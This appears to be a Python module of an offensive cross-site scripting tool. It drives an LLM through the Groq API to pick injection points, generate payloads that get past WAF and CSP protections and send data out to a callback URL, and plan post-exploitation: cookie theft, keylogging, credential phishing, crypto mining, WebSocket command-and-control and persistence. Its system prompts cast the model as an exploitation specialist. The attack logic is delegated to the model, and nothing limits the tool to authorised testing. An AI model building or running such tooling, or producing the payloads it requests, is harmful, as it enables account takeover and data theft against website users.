import json
import re
import time
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs

import requests

from . import config
from . import utils


@dataclass
class InjectionCandidate:
    url: str
    parameter: str
    method: str
    context: str
    confidence: float
    reasoning: str
    payload_strategy: str
    priority: int


@dataclass
class AIAnalysisResult:
    candidates: List[InjectionCandidate]
    global_strategy: str
    waf_evasion_plan: List[str]
    estimated_success_rate: float


class GroqClient:
    def __init__(self, api_key: str, model: str = "mixtral-8x7b-32768", base_url: str = "https://api.groq.com/openai/v1"):
        self.api_key = api_key
        self.model = model
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        })
        self.request_count = 0
        self.last_request_time = 0
        self.min_interval = 0.5

    def _rate_limit(self):
        elapsed = time.time() - self.last_request_time
        if elapsed < self.min_interval:
            time.sleep(self.min_interval - elapsed)
        self.last_request_time = time.time()

    def chat_completion(self, messages: List[Dict], temperature: float = 0.3, max_tokens: int = 4000) -> Optional[str]:
        self._rate_limit()
        payload = {
            "model": self.model,
            "messages": messages,
            "temperature": temperature,
            "max_tokens": max_tokens,
            "stream": False
        }
        try:
            resp = self.session.post(f"{self.base_url}/chat/completions", json=payload, timeout=60)
            if resp.status_code == 200:
                self.request_count += 1
                return resp.json()["choices"][0]["message"]["content"]
            elif resp.status_code == 429:
                time.sleep(2)
                return self.chat_completion(messages, temperature, max_tokens)
            else:
                print(f"  [AI] Groq API error: {resp.status_code} - {resp.text[:200]}")
        except Exception as e:
            print(f"  [AI] Request failed: {e}")
        return None

    def analyze_injection_points(self, crawl_data: Dict, target_info: Dict) -> AIAnalysisResult:
        prompt = self._build_injection_analysis_prompt(crawl_data, target_info)
        response = self.chat_completion([
            {"role": "system", "content": self._get_system_prompt()},
            {"role": "user", "content": prompt}
        ], temperature=0.2, max_tokens=6000)
        
        if response:
            return self._parse_ai_response(response)
        return AIAnalysisResult([], "fallback", [], 0.0)

    def generate_context_payloads(self, context: str, framework: str, waf_info: Dict, 
                                  previous_failures: List[str], collab_url: str) -> List[str]:
        prompt = self._build_payload_generation_prompt(context, framework, waf_info, previous_failures, collab_url)
        response = self.chat_completion([
            {"role": "system", "content": self._get_payload_system_prompt()},
            {"role": "user", "content": prompt}
        ], temperature=0.4, max_tokens=4000)
        
        if response:
            return self._extract_payloads(response)
        return []

    def analyze_response_for_xss(self, payload: str, response_text: str, headers: Dict, 
                                 context: str) -> Dict:
        prompt = self._build_response_analysis_prompt(payload, response_text, headers, context)
        response = self.chat_completion([
            {"role": "system", "content": self._get_response_analysis_prompt()},
            {"role": "user", "content": prompt}
        ], temperature=0.1, max_tokens=2000)
        
        if response:
            return self._parse_response_analysis(response)
        return {"vulnerable": False, "confidence": 0.0, "evidence": [], "bypass_techniques": []}

    def suggest_post_exploitation(self, vuln_details: Dict, collab_url: str, aggressive: bool) -> List[Dict]:
        prompt = self._build_post_exploit_prompt(vuln_details, collab_url, aggressive)
        response = self.chat_completion([
            {"role": "system", "content": self._get_post_exploit_prompt()},
            {"role": "user", "content": prompt}
        ], temperature=0.3, max_tokens=4000)
        
        if response:
            return self._parse_post_exploit_response(response)
        return []

    def _get_system_prompt(self) -> str:
        return """You are an elite XSS vulnerability researcher and exploitation expert. Your task is to analyze web application attack surfaces and identify the most promising injection points for Cross-Site Scripting attacks.

You have deep knowledge of:
- Reflected, Stored, DOM-based, Blind, and Mutation XSS
- Server-Side Template Injection (SSTI) leading to XSS
- Client-side framework vulnerabilities (React, Vue, Angular, Svelte, Next.js, Nuxt)
- Modern browser APIs (WebSockets, Service Workers, Web Workers, postMessage, IndexedDB)
- WAF bypass techniques for Cloudflare, ModSecurity, AWS WAF, Akamai, F5, Imperva
- Context-aware payload construction (HTML, Attribute, JavaScript, URL, CSS, JSON)
- CSP bypass strategies
- Post-exploitation: cookie theft, session hijacking, keylogging, credential harvesting, 
  form grabbing, clipboard theft, crypto mining, port scanning, phishing, defacement,
  storage poisoning, clickjacking, BeEF-style hooking, C2 establishment

Output ONLY valid JSON. No markdown, no explanations."""

    def _get_payload_system_prompt(self) -> str:
        return """You are an expert XSS payload engineer. Generate highly effective, context-specific XSS payloads that bypass modern protections.

Consider:
- Injection context (HTML, attribute, JavaScript, URL, CSS, JSON, template)
- Target framework (React, Vue, Angular, Svelte, vanilla JS)
- Detected WAF (Cloudflare, ModSecurity, AWS WAF, etc.)
- CSP policies
- Previous failed attempts
- Need for blind/OOB exfiltration via callback URL

Output ONLY a JSON array of payload strings. No markdown, no explanations."""

    def _get_response_analysis_prompt(self) -> str:
        return """You are an XSS detection expert. Analyze HTTP responses to determine if an XSS payload executed or was reflected in an exploitable way.

Check for:
- Direct/partial payload reflection
- Encoded/decoded variations
- DOM sink reachability
- JavaScript execution indicators
- CSP violations/errors in response
- WAF blocking indicators
- Framework-specific rendering behaviors

Output ONLY valid JSON with fields: vulnerable (bool), confidence (0-1), evidence (array), bypass_techniques (array), execution_context (string)."""

    def _get_post_exploit_prompt(self) -> str:
        return """You are a post-exploitation specialist. Given a confirmed XSS vulnerability, design advanced exploitation chains.

Generate techniques for:
- Persistent compromise (service worker, localStorage, IndexedDB poisoning)
- Command & Control establishment (BeEF-style hooks, WebSocket C2)
- Lateral movement (SSRF via XSS, internal network reconnaissance)
- Credential harvesting (phishing overlays, form grabbers, keyloggers)
- Data exfiltration (cookies, tokens, localStorage, sessionStorage, clipboard)
- Browser fingerprinting and profiling
- Crypto mining injection
- Defacement and persistence
- Clickjacking and UI redressing
- Port scanning from victim's browser
- History sniffing
- Token fixation and session riding

Output ONLY JSON array of exploitation objects with: name, description, payload, stealth_level, persistence, requirements."""

    def _build_injection_analysis_prompt(self, crawl_data: Dict, target_info: Dict) -> str:
        forms_summary = []
        for f in crawl_data.get("forms", [])[:15]:
            forms_summary.append(f"  {f['method']} {f['url']} inputs: {[i['name'] for i in f['inputs']]}")
        
        urls_summary = list(crawl_data.get("urls", []))[:20]
        scripts_summary = []
        for s in crawl_data.get("scripts", [])[:10]:
            if s.get("src"):
                scripts_summary.append(f"  External: {s['src']}")
            elif s.get("inline"):
                scripts_summary.append(f"  Inline: {s['content'][:200]}")
        
        return f"""Analyze this target for XSS injection points.

TARGET INFO:
- URL: {target_info.get('url', 'unknown')}
- Framework: {target_info.get('framework', 'unknown')}
- CSP: {json.dumps(target_info.get('csp', {}))}
- Encoding: {target_info.get('encoding', 'UTF-8')}
- Headers: {json.dumps(dict(list(target_info.get('headers', {}).items())[:10]))}

DISCOVERED FORMS ({len(crawl_data.get('forms', []))} total):
{chr(10).join(forms_summary)}

DISCOVERED URLS ({len(crawl_data.get('urls', []))} total):
{chr(10).join(urls_summary[:20])}

DISCOVERED SCRIPTS ({len(crawl_data.get('scripts', []))} total):
{chr(10).join(scripts_summary)}

AJAX ENDPOINTS: {crawl_data.get('ajax_endpoints', [])[:10]}
COMMON PARAMS FOUND: {list(crawl_data.get('params', []))[:20]}

Return JSON with:
{{
  "candidates": [
    {{
      "url": "target URL",
      "parameter": "parameter name",
      "method": "GET/POST",
      "context": "html/attribute/javascript/url/css/json/template",
      "confidence": 0.0-1.0,
      "reasoning": "why this is promising",
      "payload_strategy": "reflected/stored/dom/blind/ssti/mutation",
      "priority": 1-10
    }}
  ],
  "global_strategy": "overall approach description",
  "waf_evasion_plan": ["technique1", "technique2"],
  "estimated_success_rate": 0.0-1.0
}}"""

    def _build_payload_generation_prompt(self, context: str, framework: str, waf_info: Dict, 
                                         previous_failures: List[str], collab_url: str) -> str:
        return f"""Generate 20 advanced XSS payloads for this context.

CONTEXT: {context}
FRAMEWORK: {framework}
WAF DETECTED: {json.dumps(waf_info)}
CSP: {json.dumps(waf_info.get('csp', {}))}
PREVIOUS FAILURES: {previous_failures[:5]}
CALLBACK URL (for blind/OOB): {collab_url}

Requirements:
- Bypass detected WAF
- Work in {context} context
- Leverage {framework} specifics if applicable
- Include encoded variants
- Include blind/OOB exfiltration payloads using callback URL
- Include CSP bypass attempts
- Modern browser API abuse (fetch, sendBeacon, WebSocket, EventSource)

Return ONLY JSON array of payload strings."""

    def _build_response_analysis_prompt(self, payload: str, response_text: str, headers: Dict, context: str) -> str:
        truncated_response = response_text[:5000]
        return f"""Analyze this HTTP response for XSS execution/reflection.

INJECTED PAYLOAD: {payload[:200]}
CONTEXT: {context}
RESPONSE HEADERS: {json.dumps(dict(list(headers.items())[:15]))}
RESPONSE BODY (truncated): {truncated_response}

Check for:
1. Direct payload reflection
2. Encoded/transformed reflection
3. Dangerous sink proximity (innerHTML, eval, etc.)
4. JavaScript execution evidence
5. CSP violation reports
6. WAF blocking signs
7. Framework rendering quirks

Return ONLY JSON:
{{
  "vulnerable": true/false,
  "confidence": 0.0-1.0,
  "evidence": ["specific finding 1", "finding 2"],
  "bypass_techniques": ["technique1", "technique2"],
  "execution_context": "html/attribute/js/url/css/unknown",
  "reflection_type": "direct/partial/encoded/none",
  "dom_sinks_reachable": ["sink1", "sink2"]
}}"""

    def _build_post_exploit_prompt(self, vuln_details: Dict, collab_url: str, aggressive: bool) -> str:
        return f"""Design advanced post-exploitation chain for this confirmed XSS.

VULNERABILITY: {json.dumps(vuln_details, default=str)}
CALLBACK URL: {collab_url}
AGGRESSIVE MODE: {aggressive}

Generate exploitation techniques as JSON array:
[
  {{
    "name": "technique_name",
    "description": "what it does",
    "payload": "actual JS payload",
    "stealth_level": "low/medium/high",
    "persistence": "none/session/persistent",
    "requirements": ["requirement1", "requirement2"],
    "callback_endpoint": "/endpoint_on_collab_server"
  }}
]

Include: cookie theft, session hijacking, keylogging, form grabbing, credential phishing,
clipboard theft, crypto miner, port scanning, internal reconnaissance, service worker persistence,
localStorage/IndexedDB poisoning, BeEF-style hook, WebSocket C2, clickjacking, defacement,
history sniffing, token fixation, screenshot capture, full chain exfiltration."""

    def _parse_ai_response(self, response: str) -> AIAnalysisResult:
        try:
            data = json.loads(response)
            candidates = []
            for c in data.get("candidates", []):
                candidates.append(InjectionCandidate(
                    url=c.get("url", ""),
                    parameter=c.get("parameter", ""),
                    method=c.get("method", "GET"),
                    context=c.get("context", "html"),
                    confidence=float(c.get("confidence", 0.5)),
                    reasoning=c.get("reasoning", ""),
                    payload_strategy=c.get("payload_strategy", "reflected"),
                    priority=int(c.get("priority", 5))
                ))
            return AIAnalysisResult(
                candidates=candidates,
                global_strategy=data.get("global_strategy", ""),
                waf_evasion_plan=data.get("waf_evasion_plan", []),
                estimated_success_rate=float(data.get("estimated_success_rate", 0.5))
            )
        except Exception as e:
            print(f"  [AI] Failed to parse injection analysis: {e}")
            return AIAnalysisResult([], "fallback", [], 0.0)

    def _extract_payloads(self, response: str) -> List[str]:
        try:
            data = json.loads(response)
            if isinstance(data, list):
                return [str(p) for p in data if isinstance(p, str)]
        except Exception:
            pass
        return []

    def _parse_response_analysis(self, response: str) -> Dict:
        try:
            return json.loads(response)
        except Exception:
            return {"vulnerable": False, "confidence": 0.0, "evidence": [], "bypass_techniques": []}

    def _parse_post_exploit_response(self, response: str) -> List[Dict]:
        try:
            data = json.loads(response)
            if isinstance(data, list):
                return data
        except Exception:
            pass
        return []


class AIInjectionAnalyzer:
    def __init__(self, groq_client: Optional[GroqClient] = None):
        self.groq = groq_client
        self.analysis_cache: Dict[str, AIAnalysisResult] = {}

    def analyze_target(self, crawl_data: Dict, target_info: Dict) -> AIAnalysisResult:
        cache_key = hashlib.md5(json.dumps(crawl_data, sort_keys=True, default=str).encode()).hexdigest()
        if cache_key in self.analysis_cache:
            return self.analysis_cache[cache_key]
        
        if self.groq:
            result = self.groq.analyze_injection_points(crawl_data, target_info)
        else:
            result = self._fallback_analysis(crawl_data, target_info)
        
        self.analysis_cache[cache_key] = result
        return result

    def _fallback_analysis(self, crawl_data: Dict, target_info: Dict) -> AIAnalysisResult:
        candidates = []
        for form in crawl_data.get("forms", [])[:10]:
            for inp in form.get("inputs", []):
                if inp.get("type") not in ["submit", "button", "hidden", "file"]:
                    candidates.append(InjectionCandidate(
                        url=form["url"],
                        parameter=inp["name"],
                        method=form["method"],
                        context="html",
                        confidence=0.7,
                        reasoning="Form input with user-controlled data",
                        payload_strategy="reflected",
                        priority=7
                    ))
        
        for url in crawl_data.get("urls", [])[:15]:
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param in params:
                    candidates.append(InjectionCandidate(
                        url=url.split("?")[0],
                        parameter=param,
                        method="GET",
                        context="html",
                        confidence=0.6,
                        reasoning="URL parameter reflects in response",
                        payload_strategy="reflected",
                        priority=6
                    ))
        
        return AIAnalysisResult(
            candidates=candidates[:20],
            global_strategy="Comprehensive reflected and stored XSS testing with WAF evasion",
            waf_evasion_plan=["case_variation", "comment_injection", "encoding", "fragment_injection"],
            estimated_success_rate=0.4
        )


class AIEnhancedPayloadEngine:
    def __init__(self, groq_client: Optional[GroqClient] = None, collab_url: str = None):
        self.groq = groq_client
        self.collab_url = collab_url
        self.payload_cache: Dict[str, List[str]] = {}
        self.failure_history: Dict[str, List[str]] = {}

    def generate_smart_payloads(self, context: str, framework: str, waf_info: Dict, 
                                target_url: str, param: str) -> List[str]:
        cache_key = f"{context}:{framework}:{json.dumps(waf_info, sort_keys=True)}:{target_url}:{param}"
        if cache_key in self.payload_cache:
            return self.payload_cache[cache_key]
        
        previous_failures = self.failure_history.get(cache_key, [])
        
        if self.groq:
            payloads = self.groq.generate_context_payloads(
                context, framework, waf_info, previous_failures, self.collab_url or ""
            )
        else:
            payloads = self._fallback_payloads(context, framework, waf_info)
        
        self.payload_cache[cache_key] = payloads
        return payloads

    def record_failure(self, context: str, framework: str, waf_info: Dict, 
                       target_url: str, param: str, payload: str):
        cache_key = f"{context}:{framework}:{json.dumps(waf_info, sort_keys=True)}:{target_url}:{param}"
        if cache_key not in self.failure_history:
            self.failure_history[cache_key] = []
        self.failure_history[cache_key].append(payload)

    def _fallback_payloads(self, context: str, framework: str, waf_info: Dict) -> List[str]:
        from .payload_engine import context_specific_payloads, PayloadEngine
        engine = PayloadEngine(collab_url=self.collab_url)
        base = engine.generate_reflected(max_payloads=50)
        ctx = context_specific_payloads(context, self.collab_url)
        return list(set(base + ctx))[:80]


class AIResponseAnalyzer:
    def __init__(self, groq_client: Optional[GroqClient] = None):
        self.groq = groq_client

    def analyze(self, payload: str, response_text: str, headers: Dict, context: str) -> Dict:
        if self.groq:
            return self.groq.analyze_response_for_xss(payload, response_text, headers, context)
        return self._fallback_analysis(payload, response_text, headers, context)

    def _fallback_analysis(self, payload: str, response_text: str, headers: Dict, context: str) -> Dict:
        from .response_analyzer import ResponseAnalyzer
        analyzer = ResponseAnalyzer()
        reflected, method, confidence = analyzer.detect_reflection(payload, response_text)
        return {
            "vulnerable": reflected,
            "confidence": confidence,
            "evidence": [method] if reflected else [],
            "bypass_techniques": [],
            "execution_context": context,
            "reflection_type": "direct" if payload in response_text else "partial" if reflected else "none",
            "dom_sinks_reachable": []
        }